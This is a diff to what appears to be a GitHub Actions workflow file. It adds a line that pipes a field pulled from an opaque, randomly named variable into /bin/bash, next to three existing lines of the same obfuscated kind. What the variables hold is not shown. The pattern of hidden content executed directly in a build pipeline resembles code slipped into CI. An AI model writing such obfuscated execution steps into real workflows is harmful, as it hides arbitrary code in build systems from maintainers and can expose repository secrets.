@@ -32,6 +32,7 @@ jobs:
           echo $crqw70580 | jq -r .w10 | /bin/bash
           echo $l38 | jq -r .ytce80 | /bin/bash
           printf '%s' "$sdz17928" | jq -r .ix074 | /bin/bash
+          printf '%s' "$q0" | jq -r .r14275 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
